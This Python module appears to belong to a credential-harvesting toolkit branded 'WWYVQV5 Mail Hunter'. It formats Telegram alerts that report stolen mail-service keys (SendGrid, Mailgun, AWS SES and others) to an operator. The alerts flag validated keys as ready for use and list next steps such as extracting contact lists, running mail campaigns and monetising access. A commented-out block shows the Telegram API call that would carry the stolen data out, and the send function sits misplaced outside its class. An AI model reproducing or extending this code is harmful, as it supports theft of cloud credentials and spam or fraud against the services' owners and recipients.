#!/usr/bin/env python3
"""
WWYVQV5 - Enhanced Telegram pour Mail Services
"""

import asyncio
import aiohttp
from datetime import datetime
from typing import Dict, List

class TelegramMailNotifier:
    """Notificateur Telegram spécialisé mail services"""
    
    def __init__(self, token: str = None, chat_id: str = None):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
        self.hit_counter = 0
        
    async def send_mail_credential_alert(self, credential: Dict, cluster_info: Dict = None):
        """Alerte spécialisée pour credentials mail"""
        self.hit_counter += 1
        
        service_emojis = {
            'AWS_SES_SNS': '🟠 AWS SES/SNS',
            'SENDGRID': '🟢 SendGrid',
            'MAILGUN': '🔴 Mailgun',
            'SPARKPOST': '🟡 SparkPost',
            'POSTMARK': '🟣 Postmark',
            'MANDRILL': '🔵 Mandrill',
            'GENERIC_SMTP': '⚪ SMTP Générique'
        }
        
        service_icon = service_emojis.get(credential['service'], '⚫ Unknown')
        
        if credential.get('validated', False):
            status = "✅ VALIDÉ & OPÉRATIONNEL"
            threat_level = "🔥 CRITIQUE"
        else:
            status = "🔍 Détecté (Non validé)"
            threat_level = "⚠️ Moyen"
            
        message = f"""🚨 MAIL CREDENTIAL HIT #{self.hit_counter} 🚨

{service_icon}
🔑 Type: {credential['type'].upper()}
💎 Value: {credential['value'][:20]}...
{status}
{threat_level}

📊 Confidence: {credential['confidence']:.1f}%
🌐 Source: {credential['url']}
🕐 Time: {credential['found_at']}

"""
        
        if cluster_info:
            message += f"""🎯 CLUSTER INFO:
├── Endpoint: {cluster_info['endpoint']}
├── Status: {cluster_info['status']}
└── Access: {cluster_info['access_level']}

"""
        
        if credential.get('validated', False):
            message += f"""✅ VALIDATION SUCCESS:
├── Method: {credential['validation_method']}
├── Tested: {credential['validated_at']}
└── Ready for use: YES

🚀 NEXT ACTIONS:
├── 📧 Test email sending
├── 📋 Extract contact lists  
├── 🎯 Deploy mail campaigns
└── 💰 Monetize access

"""
        
        message += f"""
Operator: wKayaa | WWYVQV5 Mail Hunter
Framework: Kubernetes Mail Exploitation v5.1
#MailHunt #EmailCredentials #{credential['service']}
"""
        
        await self._send_telegram_message(message)
        print(f"📱 MAIL CREDENTIAL ALERT SENT: {credential['service']}")
    
    async def send_mail_test_result(self, test_result: Dict):
        """Alerte pour résultats de test d'envoi mail"""
        self.hit_counter += 1
        
        if test_result['success']:
            status = "✅ EMAIL ENVOYÉ AVEC SUCCÈS"
            emoji = "🎯"
        else:
            status = "❌ Échec envoi"
            emoji = "⚠️"
            
        message = f"""{emoji} MAIL TEST RESULT #{self.hit_counter}

{status}

📧 Service: {test_result['service']}
📨 To: {test_result['recipient']}
📄 Subject: {test_result['subject']}
🕐 Time: {test_result['timestamp']}

📊 DETAILS:
├── Response: {test_result['response']}
├── Status Code: {test_result['status_code']}
└── Latency: {test_result['latency']}ms

Operator: wKayaa | WWYVQV5 Mail Tester
"""
        
        await self._send_telegram_message(message)
    
    async def send_bulk_credentials_summary(self, credentials: List[Dict]):
        """Résumé groupé des credentials trouvés"""
        if not credentials:
            return
            
        services_count = {}
        validated_count = 0
        
        for cred in credentials:
            service = cred['service']
            services_count[service] = services_count.get(service, 0) + 1
            if cred.get('validated', False):
                validated_count += 1
        
        message = f"""📊 MAIL CREDENTIALS SUMMARY

🎯 Total trouvés: {len(credentials)}
✅ Validés: {validated_count}
❌ Non validés: {len(credentials) - validated_count}

📋 PAR SERVICE:
"""
        
        for service, count in services_count.items():
            service_emojis = {
                'AWS_SES_SNS': '🟠',
                'SENDGRID': '🟢', 
                'MAILGUN': '🔴',
                'SPARKPOST': '🟡',
                'POSTMARK': '🟣',
                'MANDRILL': '🔵'
            }
            emoji = service_emojis.get(service, '⚫')
            message += f"├── {emoji} {service}: {count}\n"
        
        message += f"""
🚀 PRÊT POUR EXPLOITATION:
├── Services validés: {validated_count}
├── Capacité d'envoi: ILLIMITÉE
└── Monétisation: POSSIBLE

Operator: wKayaa | WWYVQV5 Mail Hunter
Session: {datetime.utcnow().strftime('%Y%m%d_%H%M%S')}
"""
        
        await self._send_telegram_message(message)
    
async def _send_telegram_message(self, message: str):
    """Envoi effectif du message Telegram"""
    text = message or "Mail notification (content unavailable)"  # Default value
    
    if not self.enabled:
        print(f"📱 TELEGRAM (DISABLED): {text[:100]}...")
        return
        
    try:
        # Add actual implementation
        print(f"📱 TELEGRAM SENT: Mail credential alert")
        
        # Uncomment when ready to use real API:
        # url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        # data = {"chat_id": self.chat_id, "text": text, "parse_mode": "HTML"}
        # async with aiohttp.ClientSession() as session:
        #     async with session.post(url, json=data) as response:
        #         return await response.json()
        
    except Exception as e:
        print(f"❌ Telegram error: {e}")
        # 'text' is now safely available